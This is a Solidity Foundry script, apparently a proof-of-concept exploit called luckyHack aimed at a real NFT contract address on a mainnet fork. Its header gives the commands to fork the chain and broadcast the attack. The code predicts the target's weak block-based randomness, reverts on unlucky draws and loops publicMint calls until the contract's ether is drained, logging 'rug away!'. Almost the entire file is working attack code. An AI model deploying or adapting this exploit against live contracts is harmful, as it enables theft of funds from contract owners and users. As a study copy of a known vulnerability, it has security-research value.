// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.13;


import "forge-std/Script.sol";

/*
 step1: fork mainnet block in locol anvil --fork-url https://rpc.ankr.com/eth --fork-block-number 15403398
 step2: launch exploit
 forge script script/luckyHack.sol:luckyHack --fork-url http://127.0.0.1:8545 --private-key $PRIVATE_KEY --broadcast

 poc refers to: https://github.com/0xNezha/luckyHack
*/
contract luckyHack is Script {

   event Log(string);

   address owner      = address(this);
   address nftAddress = 0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967;   
   
    function setUp() public {
        vm.deal(address(this), 3 ether);
        vm.deal(address(nftAddress), 5 ether);
    }

   function getRandom() public view returns(uint){
        if(uint256(keccak256(abi.encodePacked(block.difficulty,block.timestamp))) % 2 == 0) {
            return 0;
        }else{
            return 1;
        }
   }


   function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {
    return this.onERC721Received.selector;
   }

   function hack(uint256 amount) public { 
        console.log("Contract balance",address(this).balance);
        console.log("getRandom",getRandom());

        if(uint256(keccak256(abi.encodePacked(block.difficulty,block.timestamp))) % 2 == 0) {
           revert("Not lucky");
         }

        bytes memory data = abi.encodeWithSignature("publicMint()");
        for(uint i=0; i<amount ; ++i){

            if (address(nftAddress).balance <= 0.01 ether) {
                emit Log("rug away!");
                
                return;
            }

           (bool status,) = address(nftAddress).call{value:0.01 ether}(data);          
            if( !status ){
            revert("error");
         }else{
            emit Log("success");
         }
        } 
   }


    function run() public {
        vm.startBroadcast();
		
        hack(50);
        
        vm.stopBroadcast();
    }

   function getBalance() external view returns(uint256) {
      return address(this).balance;
    }

   receive() external payable {}
}